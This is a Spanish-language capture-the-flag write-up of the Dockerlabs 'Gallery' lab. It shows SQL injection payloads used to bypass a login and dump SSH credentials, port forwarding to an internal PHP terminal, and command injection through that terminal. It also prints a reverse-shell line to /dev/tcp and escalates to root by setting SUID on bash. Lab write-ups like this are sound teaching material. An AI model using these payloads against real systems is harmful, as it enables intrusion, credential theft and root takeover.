---
title: Gallery - Hard (Dockerlabs)
permalink: /Gallery-Dockerlabs-Writeup/
tags:
  - "Linux"
  - "Hard"
  - "SQL Injection"
  - "Local Port Forwarding"
  - "SSH"
  - "Command Injection"
categories:
  - "writeup"
  - "hacking"
  - "dockerlabs"
  - "hacking web"
toc: true
toc_label: Topics
toc_sticky: true
sidebar:
  - main
seo_tittle: Gallery - Hard (Dockerlabs)
seo_description: Practica inyecciones SQL para eludir autenticación en una web. Enumera bases de datos para extraer información sensible y logra ejecución de comandos para vencer Gallery.
excerpt: Practica inyecciones SQL para eludir autenticación en una web. Enumera bases de datos para extraer información sensible y logra ejecución de comandos para vencer Gallery.
header:
  overlay_image: /assets/images/headers/gallery-dockerlabs.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/gallery-dockerlabs.jpg
---


![image-center](/assets/images/posts/gallery-dockerlabs.png)
{: .align-center}

**Habilidades:** SQL Injection - Boolean Based, SQL Injection - `UNION` Based Attack, SSH Local Port Forwarding, Command Injection
{: .notice--primary}

# Introducción

Gallery es un laboratorio vulnerable en `docker` de dificultad `Difícil` en Dockerlabs. Esta máquina requiere habilidades de explotación de inyección SQL para enumerara bases de datos y extraer información sensible, además aprenderemos análisis de código para lograr una ejecución de comandos en un servicio web personalizado.
<br>

# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c 1 172.17.0.2
PING 172.17.0.2 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.255 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.255/0.255/0.255/0.000 ms
~~~


## Nmap Scanning 

Comenzaremos realizando un escaneo de puertos abiertos a la máquina víctima, en este caso usaremos primeramente el protocolo TCP, sino, probaríamos otros protocolos como UDP o SCTP

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2 -oG openPorts                                                 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-27 15:09 EDT
Nmap scan report for 172.17.0.2
Host is up (0.000028s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 3.97 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

En esta primera captura podremos notar que solamente existen dos servicios expuestos en la máquina víctima: `ssh` y `http`. Realizaremos un segundo escaneo con el fin de identificar la versión de los servicios que se ejecutan

~~~ bash
nmap -p 22,80 -sVC 172.17.0.2 -oN services                                                                                          
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-27 15:10 EDT
Nmap scan report for gallery.dl (172.17.0.2)
Host is up (0.00012s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 19:95:1a:f2:f6:7a:a1:f1:ba:16:4b:58:a0:59:f2:02 (ECDSA)
|_  256 e7:e9:8f:b8:db:94:c2:68:11:4c:25:81:f1:ac:cd:ac (ED25519)
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.3.6)
|_http-title: Galer\xC3\xADa de Arte Digital
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.08 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

Contamos con una versión de `ssh` actualizada. En cuanto al servidor HTTP, podemos ver que se trata de un servidor que usa PHP en vez de Apache, (que es la tecnología más común)


## Web Analysis

Realizaremos un escaneo de las tecnologías web que se ejecutan en el servidor

~~~ bash
whatweb http://172.17.0.2              
http://172.17.0.2 [200 OK] Country[RESERVED][ZZ], HTML5, IP[172.17.0.2], PHP[8.3.6], Title[Galería de Arte Digital], X-Powered-By[PHP/8.3.6]
~~~

Si navegamos hasta la web podremos ver su contenido. Se trata de una galería de arte digital

![image-center](/assets/images/posts/gallery-web-1.png)
{: .align-center}

El botón de la esquina superior derecha nos redirige a `login.php`. Si navegamos hasta este archivo vemos una página de inicio de sesión

![image-center](/assets/images/posts/gallery-web-2.png)
{: .align-center}

Si usamos un proxy HTTP para ver la solicitud al intentar inicar sesión, debería verse de la siguiente forma

~~~ http
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://172.17.0.2
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://172.17.0.2/login.php
Cookie: PHPSESSID=js921fuhgprnj6t5d99r9fua8c
Upgrade-Insecure-Requests: 1
Priority: u=0, i


username=admin&password=admin
~~~

Estaríamos enviando dos valores al servidor, `username` y `password`. La respuesta del servidor es la siguiente, indicando que las credenciales no son válidas

~~~ http
...
...
<button type="submit" class="login-btn">Login</button>
      <div class="error-message">Invalid credentials</div>
   </form>
</div>
~~~

Podríamos intentar hacer fuerza bruta a este panel, pero primero intentaremos forzar algún mensaje diferente o generar un error.
<br>


# Intrusión / Explotación
---
## SQL Injection - Boolean Based

Si enviamos una comilla simple (`'`) en alguno de los campos, podemos notar que se el servidor nos arroja el siguiente error

~~~ bash
<br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'hola'' LIMIT 1' at line 1 in /var/www/html/login.php:24
Stack trace:
#0 /var/www/html/login.php(24): mysqli_query()
#1 {main}
  thrown in <b>/var/www/html/login.php</b> on line <b>24</b><br />
~~~

Este error hace referencia a que no usamos una sintaxis SQL adecuada para la consulta que se emplea en este panel. **Esto es una buena señal**, en este caso, nos señalan el error, estamos abriendo una nueva cadena sin cerrarla, lo que genera el error

~~~ bash
'admin'' LIMIT 1'
~~~

Intentaremos enviar una sentencia SQL que nos permita eludir la autenticación con un operador `or`

~~~ sql
username=hola' or 1=1-- -&password=hola
~~~

> De esta forma podemos ignorar el valor de `username` para obligar a la consulta a que retorne un valor verdadero, además, no importará el valor de `password` ya que estamos comentando el resto de la query SQL
{: .notice--danger}

Ingresaremos a la siguiente web, donde podremos agregar una nueva obra de arte
 
![image-center](/assets/images/posts/gallery-web-3.png)
{: .align-center}


## SQL Injection - `UNION` Based

Si usamos la barra de búsqueda de forma que intentamos generar un error SQL enviando una comilla `'`, veremos el siguiente error

~~~ text
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1 in /var/www/html/dashboard.php:23 Stack trace: #0 /var/www/html/dashboard.php(23): mysqli_query() #1 {main} thrown in /var/www/html/dashboard.php on line 23
~~~

### Number of columns

Estamos de igual forma ocasionando un error de sintaxis al abrir una nueva cadena en la consulta SQL

> Intentaremos hacer una consulta para adivinar la cantidad de columnas que admite la tabla. **Comenzaremos con un número grande para forzar un error e iremos disminuyéndolo hasta que la consulta se ejecute sin errores**
{: .notice--danger}

~~~ sql
' ORDER BY 10-- -
~~~

~~~ text
Fatal error: Uncaught mysqli_sql_exception: Unknown column '10' in 'order clause' in /var/www/html/dashboard.php:23 Stack trace: #0 /var/www/html/dashboard.php(23): mysqli_query() #1 {main} thrown in /var/www/html/dashboard.php on line 23
~~~

Si intentamos ordenar los registros de acuerdo a la quinta columna, sabremos que la tabla posee `5` columnas

~~~ bash
' ORDER BY 5-- -
~~~

Ahora es cuando podemos usar la palabra `UNION` para añadir un registro al resultado de la consulta original, en este caso probaremos con números o valores `NULL`

~~~ sql
' UNION SELECT 1,2,3,4,5-- -
~~~

![image-center](/assets/images/posts/gallery-sqli-1.png)
{: .align-center}

Vemos algunos de los valores dentro de la respuesta, usaremos estos campos para extraer información de la base de datos

### Databases

Enumeraremos los nombres de las bases de datos existentes. Para ello debemos consultar la base de datos `information_schema`, que almacena información de todas las bases de datos

~~~ sql
' UNION SELECT 1,schema_name,3,4,5 FROM information_schema.schemata-- -
~~~

Al ejecutar esta consulta, veremos los nombres de las bases de datos, cada uno en una tarjeta nueva

![image-center](/assets/images/posts/gallery-sqli-2.png)
{: .align-center}

Vemos que aparte de las bases de datos de `mysql`, existen dos más: `gallery_db` y `secret_db`

- Si ejecutamos `database()` en uno de los campos inyectables, como el `3`, podremos ver que la base de datos actual es `gallery_db`

### Tables

Seleccionaremos la base de datos `secret_db` para ver las tablas existentes en esta base de datos, ahora debemos cambiar un poco la sintaxis de nuestra consulta

~~~ sql
' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema='secret_db'-- -
~~~

![image-center](/assets/images/posts/gallery-sqli-3.png)
{: align-center}

### Columns

Consultaremos las columnas para la tabla `secret` de la base de datos `secret_db`

![image-center](/assets/images/posts/gallery-sqli-4.png)

### Extracting Data

Vemos `3` campos, `id`, `ssh_users` y `ssh_pass`, creo que no tenemos muchas preguntas en este punto. Ahora extraeremos los datos de esta tabla

~~~ sql
 ' UNION SELECT 1,ssh_users,ssh_pass,4,5 FROM secret_db.secret-- -
~~~

![image-center](/assets/images/posts/gallery-sqli-5.png)

Vemos un registro de un usuario `sam` y su contraseña en texto claro. Nos autenticaremos en el servicio `ssh` utilizando estas credenciales

~~~ bash
ssh sam@172.17.0.2       
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:Eo+5P0bAKb4Oe1LGdogsFXPiLfpr//YJhU7NQUWKT7M.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
sam@172.17.0.2's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.10.11-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Sun Apr 20 14:30:35 2025 from 172.17.0.1

sam@78d96ca5e22c:~$ id
uid=1001(sam) gid=1001(sam) groups=1001(sam)
~~~

Y hemos ingresado a la máquina como el usuario `sam`, para poder limpiar la pantalla con `Ctrl + L`, definiremos la variable de entorno `TERM`

~~~ bash
sam@78d96ca5e22c:~$ export TERM=xterm
~~~
<br>


# Escalada de Privilegios
---
## Linux Enumeration

En este punto debemos buscar una forma para poder elevar nuestros privilegios además de recolectar información del sistema. Usaremos diversas técnicas de enumeración, como ver privilegios `sudo`, listar procesos, binarios `suid`, `capabilities` usuarios válidos en el sistema, archivos, etc. Podemos validar que estamos en la máquina víctima con el comando `hostname`

~~~ bash
sam@78d96ca5e22c:~$ hostname -I
172.17.0.2
~~~

### Users

Buscaremos usuarios válidos en este contenedor consultando el archivo `/etc/passwd`

~~~ bash
sam@78d96ca5e22c:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
sam:x:1001:1001::/home/sam:/bin/bash
~~~

### (Posible) Sudoers

Listaremos posibles privilegios `sudo` con el siguiente comando, veremos que este usuario no forma parte del grupo `sudo`. Además podemos ver si la otra cuenta forma parte de este grupo

~~~ bash
sam@78d96ca5e22c:~$ which sudo
/usr/bin/sudo

sam@78d96ca5e22c:~$ sudo -l
[sudo] password for sam: 
Sorry, user sam may not run sudo on 78d96ca5e22c.

sam@78d96ca5e22c:~$ cat /etc/group | grep sudo
sudo:x:27:ubuntu
~~~

### Processes

Listaremos los procesos que se estén ejecutando usando comandos como `ps` o puertos internos abiertos con `ss`

~~~ bash
sam@78d96ca5e22c:~$ ps faux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   2800  1656 ?        Ss   Apr27   0:00 /bin/sh -c service ssh start && service mysql start && php -S 0.0.0.0:80 -t /var/www/html &  php -S 127.0.0.1:8888 -t
...
...
~~~

Podemos ver que se está ejecutando un servidor `php` en el puerto `8888` de forma interna (porque la IP es de `localhost`)


## SSH Local Port Forwarding

Utilizaremos esta técnica aprovechando la conexión `ssh`. Abriremos un puerto en nuestra máquina que nos conecte hacia el puerto abierto internamente dentro de la máquina víctima, haciendo alcanzable este servicio desde nuestra máquina

~~~ bash
ssh -L 8888:127.0.0.1:8888
~~~

Si ahora navegamos hasta `localhost`, podremos ver el servicio. Se trata de una especie de terminal que aparentemente se ejecuta como `root`

![image-center](/assets/images/posts/gallery-port-forwarding.png)

Comúnmente los archivos web se guardan bajo la ruta `/var/www`. Buscaremos los archivos del servicio interno para averiguar cómo funciona a nivel de `backend`

~~~ bash
sam@78d96ca5e22c:~$ ls -la /var/www
total 0
drwxr-xr-x 1 root root  24 Apr 20 14:06 .
drwxr-xr-x 1 root root  96 Apr 19 15:11 ..
drwxr-xr-x 1 root root 100 Apr 19 16:05 html
drwxr-xr-x 1 root root  18 Apr 20 14:23 terminal
~~~

Existe un directorio `terminal` dentro de esta ruta, asumiremos que se trata de los archivos de este servicio por mera lógica. Nos trasladaremos a este directorio para ver lo que contiene

~~~ bash
sam@78d96ca5e22c:/var/www/terminal$ ls -la
total 8
drwxr-xr-x 1 root root   18 Apr 20 14:23 .
drwxr-xr-x 1 root root   24 Apr 20 14:06 ..
-rw-r--r-- 1 root root 4441 Apr 20 14:23 index.php
~~~

Posee solamente un archivo `index.php` que muy posiblemente sea el que vemos cuando accedemos a la web. Exploraremos el código para ver cómo funciona esta terminal

~~~ php
<?php
session_start();

if ($_SERVER['SERVER_ADDR'] !== '127.0.0.1' && $_SERVER['REMOTE_ADDR'] !== '127.0.0.1') {
    die('Access Denied');
}

$header = "
   ______      _ _                
  / ____/___ _/ / /__  _______  __
 / / __/ __ `/ / / _ \/ ___/ / / /
/ /_/ / /_/ / / /  __/ /  / /_/ / 
\____/\__,_/_/_/\___/_/   \__, /  
                         /____/   
Gallery Management System v1.0
--------------------------------
[?] Try thinking outside the box
";

$output = isset($_POST['command']) ? '' : $header;
$commands = ['help', 'list_art', 'show_artists', 'check_status', 'view_logs', 'system_info'];

if (isset($_POST['command'])) {
    $cmd = $_POST['command'];
    if ($cmd === 'help') {
        $output = "Available commands:\n";
        $output .= "----------------\n";
        foreach ($commands as $command) {
            $output .= "- $command\n";
        }
    ...
    ...
    } else if (strpos($cmd, ';') !== false || strpos($cmd, '|') !== false) {
        // Aquí es donde realmente ejecutamos comandos
        $output = shell_exec($cmd);
    } else {
        $output = "Command not found. Type 'help' for available commands.";
    }
    $output = $header . "\n" . $output;
}
?>
~~~

> Gracias a que contamos con el archivo que contiene el código de la web, podemos hacer un análisis para identificar un vector de explotación más rápidamente. De lo contrario, deberíamos hacer pruebas manuales enviando `;`, `|` o caracteres similares de `bash`
{: .notice--danger}

## Command Injection

En el código podemos ver que la condición `else if (strpos($cmd, ';') !== false || strpos($cmd, '|') !== false)` evalúa que nuestro input contenga uno de los caracteres `;` o `|`, si es así se ejecutará lo que enviemos a nivel de sistema

Haremos una prueba enviando un comando seguido de un `;`

~~~ bash
id;
~~~

![image-center](/assets/images/posts/gallery-command-injection.png)

Se ha ejecutado correctamente debido a que vemos el output, podemos intentar forzar ver las salidas de error (`stderr`), para cuando intentemos usar un comando. De esta forma, cuando intentemos usar un comando que no exista, veremos los errores en vez de no ver nada

~~~ bash
ping 2>&1;

sh: 1: ping: not found
~~~

## Root Time

En este punto tendríamos varias formas para elevar nuestros privilegios ya que estamos ejecutando comandos como `root`. Podríamos hacer  la `bash` un binario `suid`, enviarnos la clave privada `ssh` de `root`, o ganar acceso directamente con una `reverse shell`. Pero si lo intentamos directamente no podremos

~~~ bash
/bin/sh -c '/bin/sh -i >& /dev/tcp/172.17.0.1/443 0>&1' 2>&1;
~~~

> Podemos intentar asignar el bit `SUID` a la `bash`, antes de asumir la ruta, podemos ver donde está con el comando `which`.
{: .notice--danger}

Enviaremos el comando a la terminal web para hacer la `bash`, un binario `suid`

~~~ bash
chmod 4755 /usr/bin/bash;
~~~

Ahora nos queda comprobar que se haya asignado correctamente este permiso. Podemos aprovechar esto usando el parámetro `-p` de `bash` para ejecutarlo como el propietario, que en este caso es `root`

~~~ bash
sam@78d96ca5e22c:/var/www/terminal$ ls -l /usr/bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /usr/bin/bash
sam@78d96ca5e22c:/var/www/terminal$ bash -p
bash-5.2# whoami
root
~~~

Espero que hayas aprendido con esta guía, gracias por leer, de dejo la cita del día...

> Age does not protect you from love. But love, to some extent, protects you from age.
> — Anais Nin
{: .notice--info}